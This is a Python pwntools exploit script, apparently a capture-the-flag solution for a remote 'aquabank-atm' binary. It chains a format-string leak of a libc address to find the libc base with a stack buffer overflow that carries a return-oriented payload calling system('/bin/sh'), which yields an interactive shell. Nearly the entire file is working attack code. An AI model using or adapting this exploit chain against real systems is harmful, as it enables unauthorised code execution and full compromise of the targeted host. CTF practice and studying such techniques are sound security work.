#!/usr/bin/env python3
from pwn import *

"""
The idea here is first leak a libc address exploiting the format string,once i have a libc address using gdb VMMAP
i found the base of libc(run-time) and retrived the offset (fixed) to use in the script to calculate the libc_base.

Now i can construct the RopChain using libc gadgets and calling system(BINSH)
"""

context.binary = elf = ELF('./aquabank-atm_patched', checksec=False)
context.arch = 'amd64'
context.log_level = 'debug'

rop = ROP(elf)

libc = ELF('./libc.so.6', checksec=False)
rop_libc = ROP(libc)

HOST, PORT = "offsec.m0lecon.it", 13523
p = remote(HOST, PORT)
#p = process(elf.path)

OFFSET_TO_RIP_WITHDRAW = 128 +8

POP_RDI = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

log.info(f"RET: {hex(RET)}")
log.info(f"POP_RDI (offset libc): {hex(POP_RDI)}")

# ----------------- STAGE 1: LEAK -----------------

p.recvuntil(b"> ")
p.sendline(b"1")
p.sendline(b"%33$p") 

p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b"--- Your customer note ---\n")

leaked = p.recvline().strip()
leak = int(leaked, 16)

log.info(f"LEAKED: {hex(leak)}")

log.info(f"libc.symbols {hex(libc.symbols['__libc_start_main'])}")
log.info(f"OFFSET: {hex(leak)}")

libc_base = leak - 0x2a28b #retrived using vmmap
#libc.symbols["__libc_start_main"]  - 139
libc.address = libc_base

log.info(f"libc_base = {hex(libc_base)}")

p.recvuntil(b"> ")
#print(libc.search(p64(leak)))
#print(libc.symbols)

#gdb.attach(p)
#pause()
# ----------------- STAGE 2 -----------------

BINSH =  next(libc.search(b"/bin/sh"))
SYSTEM =  libc.sym["system"]
POP_RDI = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]

log.info(f"POP_RDI: {hex(POP_RDI)}")
log.info(f"SYSTEM: {hex(SYSTEM)}")
log.info(f"BINSH: {hex(BINSH)}")

# trigger overflow
p.sendline(b"3")

p.recvuntil(b"From account:")
p.sendline(b"AAAA")

p.recvuntil(b"Amount:")
p.sendline(b"BBBB")

p.recvuntil(b"brief):")

payload = flat(
    b"A" * (OFFSET_TO_RIP_WITHDRAW),
  #  p64(RET),        
    p64(RET),       # alignment
    p64(POP_RDI),p64(BINSH), #put as first parameter (RDI) the BINSH
    p64(SYSTEM)             #call system()
)

p.send(payload + b"\n") 

p.interactive()
